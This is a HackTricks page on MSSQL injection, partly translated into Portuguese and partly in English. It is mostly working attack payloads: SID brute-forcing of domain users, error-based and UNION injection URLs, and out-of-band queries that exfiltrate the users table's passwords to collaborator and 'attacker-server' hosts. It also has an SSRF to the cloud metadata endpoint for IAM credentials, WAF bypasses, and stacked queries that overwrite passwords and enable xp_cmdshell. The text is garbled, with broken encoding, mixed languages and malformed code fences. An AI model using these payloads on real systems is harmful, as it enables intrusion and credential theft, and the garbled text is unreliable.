# Inje√ß√£o MSSQL

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Enumera√ß√£o do Active Directory

Pode ser poss√≠vel **enumerar usu√°rios de dom√≠nio via inje√ß√£o SQL dentro de um servidor MSSQL** usando as seguintes fun√ß√µes MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: Obter o nome do dom√≠nio atual.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOM√çNIO\Administrator'))`**: Se voc√™ conhece o nome do dom√≠nio (_DOM√çNIO_ neste exemplo), esta fun√ß√£o retornar√° o **SID do usu√°rio Administrator** no formato hexadecimal. Isso parecer√° `0x01050000000[...]0000f401`, observe como os **√∫ltimos 4 bytes** s√£o o n√∫mero **500** no formato **big endian**, que √© o **ID comum do usu√°rio administrador**.\
Esta fun√ß√£o permitir√° que voc√™ **saiba o ID do dom√≠nio** (todos os bytes exceto os √∫ltimos 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Esta fun√ß√£o retornar√° o **nome de usu√°rio do ID indicado** (se houver), neste caso **0000e803** em big endian == **1000** (geralmente este √© o ID do primeiro usu√°rio regular criado). Ent√£o voc√™ pode imaginar que pode fazer for√ßa bruta nos IDs de usu√°rio de 1000 a 2000 e provavelmente obter todos os nomes de usu√°rio dos usu√°rios do dom√≠nio. Por exemplo, usando uma fun√ß√£o como a seguinte:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Vectores de Erro Alternativos**

As inje√ß√µes de SQL baseadas em erros geralmente se assemelham a constru√ß√µes como `+AND+1=@@version--` e variantes baseadas no operador ¬´OR¬ª. Consultas contendo tais express√µes s√£o geralmente bloqueadas por WAFs. Para contornar isso, concatene uma string usando o caractere %2b com o resultado de chamadas de fun√ß√£o espec√≠ficas que disparam um erro de convers√£o de tipo de dados nos dados procurados.

Alguns exemplos de tais fun√ß√µes:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Exemplo de uso da fun√ß√£o `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Esses truques de SSRF [foram retirados daqui](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Requer permiss√£o **`VIEW SERVER STATE`** no servidor.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Requer permiss√£o de **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Requer permiss√£o de **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Procedimentos armazenados como `xp_dirtree`, embora n√£o documentados oficialmente pela Microsoft, foram descritos por outros online devido √† sua utilidade em opera√ß√µes de rede dentro do MSSQL. Esses procedimentos s√£o frequentemente usados na exfiltra√ß√£o de dados fora de banda, como demonstrado em v√°rios [exemplos](https://www.notsosecure.com/oob-exploitation-cheatsheet/) e [posts](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

O procedimento armazenado `xp_dirtree`, por exemplo, √© usado para fazer solicita√ß√µes de rede, mas est√° limitado apenas √† porta TCP 445. O n√∫mero da porta n√£o √© modific√°vel, mas permite a leitura de compartilhamentos de rede. O uso √© demonstrado no script SQL abaixo:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
√â importante notar que este m√©todo pode n√£o funcionar em todas as configura√ß√µes de sistema, como no `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` em execu√ß√£o em um `Windows Server 2016 Datacenter` com as configura√ß√µes padr√£o.

Al√©m disso, existem procedimentos armazenados alternativos como `master..xp_fileexist` e `xp_subdirs` que podem alcan√ßar resultados semelhantes. Mais detalhes sobre `xp_fileexist` podem ser encontrados neste [artigo do TechNet](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Obviamente, voc√™ tamb√©m pode usar **`xp_cmdshell`** para **executar** algo que acione um **SSRF**. Para mais informa√ß√µes, **leia a se√ß√£o relevante** na p√°gina:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### Fun√ß√£o Definida pelo Usu√°rio MSSQL - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Criar uma UDF CLR (Fun√ß√£o Definida pelo Usu√°rio de Tempo de Execu√ß√£o Comum), que √© um c√≥digo desenvolvido em qualquer linguagem .NET e compilado em um DLL, para ser carregado dentro do MSSQL para executar fun√ß√µes personalizadas, √© um processo que requer acesso `dbo`. Isso significa que geralmente √© vi√°vel apenas quando a conex√£o com o banco de dados √© feita como `sa` ou com uma fun√ß√£o de Administrador.

Um projeto do Visual Studio e instru√ß√µes de instala√ß√£o s√£o fornecidos neste [reposit√≥rio do Github](https://github.com/infiniteloopltd/SQLHttp) para facilitar o carregamento do bin√°rio no MSSQL como um assembly CLR, permitindo assim a execu√ß√£o de solicita√ß√µes HTTP GET de dentro do MSSQL.

O cerne dessa funcionalidade est√° encapsulado no arquivo `http.cs`, que utiliza a classe `WebClient` para executar uma solicita√ß√£o GET e recuperar o conte√∫do, conforme ilustrado abaixo:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Antes de executar o comando SQL `CREATE ASSEMBLY`, √© aconselh√°vel executar o seguinte trecho de SQL para adicionar o hash SHA512 da assembly √† lista de assemblies confi√°veis do servidor (vis√≠vel atrav√©s de `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Depois de adicionar com sucesso a montagem e criar a fun√ß√£o, o seguinte c√≥digo SQL pode ser utilizado para realizar solicita√ß√µes HTTP:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Explora√ß√£o R√°pida: Recuperando o Conte√∫do Completo da Tabela em uma √önica Consulta**

[Truque daqui](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Um m√©todo conciso para extrair o conte√∫do completo de uma tabela em uma √∫nica consulta envolve a utiliza√ß√£o da cl√°usula `FOR JSON`. Esta abordagem √© mais sucinta do que usar a cl√°usula `FOR XML`, que requer um modo espec√≠fico como "raw". A cl√°usula `FOR JSON` √© preferida por sua brevidade.

Veja como recuperar o esquema, tabelas e colunas do banco de dados atual:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
https://vuln.app/getItem?id=1'+e+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 –∏–ª–∏ %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
```plaintext
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```sql
SELECT 'a' SELECT 'b'
```

---

```sql
SELECT 'a' SELECT 'b'
```
```

So for example, multiple queries such as:

```sql
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
```

Can be reduced to:

```sql
```plaintext
Utilize[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Adicionando um exec() in√∫til no final e fazendo o WAF pensar que esta n√£o √© uma consulta v√°lida
admina'union select 1,'admin','testtest123'exec('select 1')--
## Isso ser√°:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Usando consultas estranhamente constru√≠das
admin'exec('update[users]set[password]=''a''')--
## Isso ser√°:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Ou habilitando xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Isso ser√°
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
